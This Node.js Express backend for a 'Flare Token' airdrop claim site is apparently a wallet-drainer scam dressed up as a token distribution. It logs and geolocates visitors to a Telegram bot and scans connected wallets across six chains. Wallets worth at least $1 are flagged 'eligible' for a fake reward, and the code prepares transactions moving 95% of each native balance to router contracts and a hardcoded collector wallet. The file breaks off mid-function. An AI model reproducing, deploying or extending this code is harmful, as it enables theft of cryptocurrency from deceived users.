// index.js - FLARE TOKEN BACKEND - MULTICHAIN FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://flareairdropclaim.vercel.app', 'https://flarebackend.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Flare Token Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism',
      'https://optimism.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  },
  Flare: {
    urls: [
      'https://flare-api.flare.network/ext/C/rpc',
      'https://flare.publicnode.com',
      'https://rpc.flare.xyz'
    ],
    symbol: 'FLR',
    decimals: 18,
    chainId: 14
  },
  Songbird: {
    urls: [
      'https://songbird-api.flare.network/ext/C/rpc',
      'https://songbird.publicnode.com'
    ],
    symbol: 'SGB',
    decimals: 18,
    chainId: 19
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'BSC': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'Polygon': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
  'Flare': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
  'Songbird': null
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Flare Token',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'FLR',
    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      totalProcessedAmounts: {},
      processedTransactions: []
    },
    flowEnabled: process.env.FLOW_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  if (!telegramEnabled) return false;
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    console.error('Telegram send error:', error.message);
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('❌ Telegram not configured: Missing bot token or chat ID');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      const botInfo = response.data.result;
      
      await sendTelegramMessage(
        `🚀 <b>FLARE TOKEN BACKEND ONLINE</b>\n\n` +
        `✅ MultiChain FlowRouter Ready\n` +
        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
        `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare\n` +
        `🤖 Bot: @${botInfo.username}\n` +
        `📊 Monitoring: Active\n` +
        `⏰ Started: ${new Date().toLocaleString()}`
      );
      
      console.log(`✅ Telegram connected: @${botInfo.username}`);
      return true;
    }
  } catch (error) {
    console.log('❌ Telegram connection failed:', error.message);
  }
  
  return false;
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32,
      flr: response.data['flare-networks']?.usd || 0.03
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03 };
  }
}

// ============================================
// GET IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽',
        'South Korea': '🇰🇷', 'Singapore': '🇸🇬', 'UAE': '🇦🇪'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || '',
        lat: response.data.lat,
        lon: response.data.lon
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// ============================================
// TRACK SITE VISIT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const location = await getIPLocation(clientIP);
    
    const visit = {
      id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
      ip: clientIP.replace('::ffff:', ''),
      timestamp: new Date().toISOString(),
      country: location.country,
      flag: location.flag,
      city: location.city,
      userAgent: userAgent || 'Unknown',
      referer: referer || 'Direct',
      path: path || '/',
      walletConnected: false,
      walletAddress: null
    };
    
    memoryStorage.siteVisits.push(visit);
    
    if (memoryStorage.siteVisits.length > 1000) {
      memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-1000);
    }
    
    await sendTelegramMessage(
      `${location.flag} <b>NEW SITE VISIT</b>\n` +
      `📍 ${location.country} ${location.city ? `(${location.city})` : ''}\n` +
      `🖥️ ${userAgent?.substring(0, 30)}...\n` +
      `🔗 From: ${referer || 'Direct'}`
    );
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        city: visit.city
      }
    });
    
  } catch (error) {
    res.json({ success: true });
  }
});

// ============================================
// WALLET BALANCE CHECK
// ============================================

async function getWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING FLARE WALLET: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 },
      { name: 'Flare', symbol: 'FLR', price: prices.flr, chainId: 14 }
    ];

    let totalValue = 0;
    let chainDetails = [];
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          chainDetails.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
          });
        }
      } catch (error) {
        console.log(`   ⚠️ ${chain.name} scan failed`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.valueThreshold;
    results.balances = chainDetails;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies for FLR Distribution`;
      results.allocation = { 
        amount: '5000', 
        valueUSD: '850',
        token: 'FLR'
      };
    } else {
      results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required for FLR claim`;
      results.allocation = { amount: '0', valueUSD: '0', token: 'FLR' };
    }

    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error.message);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '✨ Welcome to Flare Token!',
        allocation: { amount: '0', valueUSD: '0', token: 'FLR' }
      }
    };
  }
}

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, totalValue, chains } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 FLARE CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    
    // Generate email from wallet
    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
    const email = `flr${hash.substring(0, 10)}@proton.me`;
    
    const lastVisit = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        claimed: false,
        userAgent: req.headers['user-agent'],
        visitId: lastVisit?.id,
        allocation: balanceResult.data.allocation,
        balances: balanceResult.data.balances
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
      
      if (memoryStorage.participants.length > 500) {
        memoryStorage.participants = memoryStorage.participants.slice(-500);
      }
    } else {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastScanned = new Date();
      participant.balances = balanceResult.data.balances;
    }
    
    if (balanceResult.data.isEligible) {
      memoryStorage.settings.statistics.eligibleParticipants++;
      
      await sendTelegramMessage(
        `${location.flag} <b>🎯 ELIGIBLE FLARE WALLET DETECTED</b>\n\n` +
        `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💼 Total Balance: $${balanceResult.data.totalValueUSD}\n` +
        `🎁 Allocation: 5,000 FLR ($${balanceResult.data.allocation.valueUSD})\n` +
        `📍 Location: ${location.country} ${location.city ? `(${location.city})` : ''}\n` +
        `📧 Email: ${email}\n` +
        `🔗 Chains: ${balanceResult.data.balances.length}\n\n` +
        `✅ READY FOR FLOW PROCESSING`
      );
    } else {
      await sendTelegramMessage(
        `${location.flag} <b>👋 NEW FLARE WALLET CONNECTED</b>\n\n` +
        `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
        `📍 Location: ${location.country} ${location.city ? `(${location.city})` : ''}\n` +
        `📧 Email: ${email}\n\n` +
        `✨ Welcome to Flare Token!`
      );
    }
    
    res.json({
      success: true,
      data: {
        walletAddress,
        email,
        country: location.country,
        flag: location.flag,
        city: location.city,
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        eligibilityReason: balanceResult.data.eligibilityReason,
        allocation: balanceResult.data.allocation,
        balances: balanceResult.data.balances,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Wallet not eligible for FLR distribution' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.95).toFixed(12),
        valueUSD: (b.valueUSD * 0.95).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      totalFLR: '5000',
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    if (memoryStorage.pendingFlows.size > 100) {
      const oldestKey = Array.from(memoryStorage.pendingFlows.keys())[0];
      memoryStorage.pendingFlows.delete(oldestKey);
    }
    
    await sendTelegramMessage(
      `🔐 <b>FLARE FLOW PREPARED</b>\n\n` +
      `👛 Wallet: ${walletAddress.substring(0, 10)}...\n` +
      `💵 Total Value: $${totalFlowUSD}\n` +
      `🎁 FLR Allocation: 5,000 FLR\n` +
      `🔗 Chains: ${transactions.length}\n` +
      `🆔 Flow ID: ${flowId}\n\n` +
      `⏳ Ready for processing`
    );
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        totalFLR: '5000',
        transactionCount: transactions.length,
        transactions,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Prepare flow error:', error);
    res.status(500).json({ success: false, error: 'Flow preparation failed' });
  }
});

// ============================================
// PROCESS FLOW ENDPOINT - UPDATED TO MATCH FRONTEND
// ============================================

app.post('/api/presale/process-flow', async (req, res) => {
  try {
    const { 
      walletAddress, 
      chainName, 
      flowId, 
      txHash,
      amount,
      symbol,
      valueUSD,
      gasFee,
      email,
      location 
    } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n💰 PROCESS FLARE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
    console.log(`   Amount: ${amount} ${symbol} ($${valueUSD})`);
    console.log(`   Gas: ${gasFee} ETH`);
    console.log(`   Email: ${email}`);
    console.log(`   Location: ${location?.country} ${location?.flag}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    // Track processed amounts by chain
    if (!memoryStorage.settings.statistics.totalProcessedAmounts[chainName]) {
      memoryStorage.settings.statistics.totalProcessedAmounts[chainName] = {
        count: 0,
        totalAmount: 0,
        totalUSD: 0,
        totalGas: 0
      };
    }
    
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].count++;
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalAmount += parseFloat(amount || 0);
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalUSD += parseFloat(valueUSD || 0);
    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalGas += parseFloat(gasFee || 0);
    
    if (participant) {
      participant.flowProcessed = true;
      participant.flowTransactions = participant.flowTransactions || [];
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        gasFee,
        timestamp: new Date().toISOString() 
      });
      
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        flowId,
        txHash,
        amount,
        symbol,
        valueUSD,
        gasFee,
        email,
        location,
        timestamp: new Date().toISOString()
      });
      
      if (memoryStorage.settings.statistics.processedTransactions.length > 200) {
        memoryStorage.settings.statistics.processedTransactions = 
          memoryStorage.settings.statistics.processedTransactions.slice(-200);
      }
      
      const flow = memoryStorage.pendingFlows.get(flowId);
      if (flow) {
        flow.completedChains = flow.completedChains || [];
        flow.completedChains.push(chainName);
        flow.status = flow.completedChains.length === flow.transactions?.length ? 'completed' : 'processing';
        
        if (flow.completedChains.length === flow.transactions?.length) {
          memoryStorage.completedFlows.set(flowId, { 
            ...flow, 
            completedAt: new Date().toISOString(),
            participant: {
              country: location?.country || participant.country,
              flag: location?.flag || participant.flag,
              email: email || participant.email
            }
          });
          
          if (memoryStorage.completedFlows.size > 50) {
            const oldestKey = Array.from(memoryStorage.completedFlows.keys())[0];
            memoryStorage.completedFlows.delete(oldestKey);
          }
          
          await sendTelegramMessage(
            `✅ <b>🎉 FLARE FLOW COMPLETED 🎉</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
            `💵 Total Value: $${flow.totalFlowUSD}\n` +
            `🎁 FLR Received: 5,000 FLR\n` +
            `🔗 All ${flow.transactions.length} chains processed\n` +
            `📍 ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
            `📧 ${email || participant.email}\n` +
            `🆔 Flow: ${flowId}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `✅ Distribution Complete`
          );
        } else {
          await sendTelegramMessage(
            `💰 <b>FLARE CHAIN PROCESSED</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
            `🔗 Chain: ${chainName}\n` +
            `💵 Amount: ${amount} ${symbol} ($${valueUSD})\n` +
            `⛽ Gas Fee: ${gasFee} ETH\n` +
            `🆔 Tx: ${txHash?.substring(0, 10)}...\n` +
            `📊 Progress: ${flow.completedChains.length}/${flow.transactions?.length}\n` +
            `📍 ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
            `📧 ${email || participant.email}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━\n` +
            `✅ Chain Processed`
          );
        }
      } else {
        // Flow not found in pending, still report the transaction
        await sendTelegramMessage(
          `💰 <b>FLARE CHAIN PROCESSED</b>\n\n` +
          `━━━━━━━━━━━━━━━━━━━━━━\n` +
          `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
          `🔗 Chain: ${chainName}\n` +
          `💵 Amount: ${amount} ${symbol} ($${valueUSD})\n` +
          `⛽ Gas Fee: ${gasFee} ETH\n` +
          `🆔 Tx: ${txHash?.substring(0, 10)}...\n` +
          `📍 ${location?.country || 'Unknown'} ${location?.flag || '🌍'}\n` +
          `📧 ${email || 'No email'}\n` +
          `━━━━━━━━━━━━━━━━━━━━━━\n` +
          `✅ Transaction Recorded`
        );
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Process flow error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================
// CLAIM ENDPOINT - UPDATED TO MATCH FRONTEND
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { 
      walletAddress, 
      email, 
      location, 
      chains, 
      totalProcessedValue, 
      reward, 
      bonus 
    } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    participant.claimData = {
      email,
      chains,
      totalProcessedValue,
      reward,
      bonus,
      location
    };
    
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    await sendTelegramMessage(
      `🎯 <b>🎉 FLARE TOKEN CLAIMED 🎉</b>\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `🎟️ Claim ID: ${claimId}\n` +
      `🎁 Reward: ${reward}\n` +
      `💰 Bonus: ${bonus}\n` +
      `💵 Total Processed: $${totalProcessedValue}\n` +
      `🔗 Chains: ${chains?.join(', ') || 'N/A'}\n` +
      `📍 Location: ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
      `📧 Email: ${email || participant.email}\n` +
      `⏰ Time: ${new Date().toLocaleString()}\n` +
      `━━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ CLAIM SUCCESSFUL`
    );
    
    res.json({ 
      success: true,
      data: {
        claimId,
        reward,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// GET FLARE STATS ENDPOINT
// ============================================

app.get('/api/flare/stats', (req, res) => {
  const totalEligible = memoryStorage.participants.filter(p => p.isEligible).length;
  const totalClaimed = memoryStorage.participants.filter(p => p.claimed).length;
  const totalFLRDistributed = totalClaimed * 5000;
  const totalValueDistributed = totalClaimed * 850;
  
  res.json({
    success: true,
    data: {
      token: 'FLR',
      totalParticipants: memoryStorage.participants.length,
      eligibleWallets: totalEligible,
      claimedWallets: totalClaimed,
      totalFLRDistributed,
      totalValueDistributed,
      pendingClaims: totalEligible - totalClaimed,
      uniqueVisitors: memoryStorage.settings.statistics.uniqueIPs.size,
      siteVisits: memoryStorage.siteVisits.length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD,
      processedByChain: memoryStorage.settings.statistics.totalProcessedAmounts,
      threshold: memoryStorage.settings.valueThreshold,
      timestamp: new Date().toISOString()
    }
  });
});

// ============================================
// ADMIN DASHBOARD
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const recentVisits = memoryStorage.siteVisits
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 50);
  
  const activeParticipants = memoryStorage.participants
    .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
    .map(p => ({
      ...p,
      connectedAt: p.connectedAt?.toISOString(),
      lastScanned: p.lastScanned?.toISOString(),
      claimedAt: p.claimedAt?.toISOString()
    }));
  
  const pendingFlows = Array.from(memoryStorage.pendingFlows.entries())
    .map(([id, flow]) => ({ id, ...flow }))
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    .slice(0, 30);
  
  const completedFlows = Array.from(memoryStorage.completedFlows.entries())
    .map(([id, flow]) => ({ id, ...flow }))
    .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
    .slice(0, 30);
  
  const processedTransactions = memoryStorage.settings.statistics.processedTransactions
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 30);
  
  const totalFLRDistributed = memoryStorage.participants.filter(p => p.claimed).length * 5000;
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    token: {
      name: 'Flare Token',
      symbol: 'FLR',
      totalSupply: '100,000,000 FLR',
      distributed: `${totalFLRDistributed.toLocaleString()} FLR`,
      valueDistributed: `$${(totalFLRDistributed * 0.17).toLocaleString()}`
    },
    summary: {
      totalVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      totalProcessedWallets: memoryStorage.settings.statistics.totalProcessedWallets,
      processedByChain: memoryStorage.settings.statistics.totalProcessedAmounts,
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
      telegramBot: telegramBotName || 'N/A'
    },
    recentVisits,
    activeParticipants: activeParticipants.slice(0, 30),
    pendingFlows,
    completedFlows: completedFlows.slice(0, 10),
    processedTransactions: processedTransactions.slice(0, 30),
    system: {
      valueThreshold: memoryStorage.settings.valueThreshold,
      flowEnabled: memoryStorage.settings.flowEnabled,
      tokenName: memoryStorage.settings.tokenName,
      tokenSymbol: memoryStorage.settings.tokenSymbol,
      collectorWallet: COLLECTOR_WALLET
    }
  });
});

// ============================================
// ADMIN STATS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
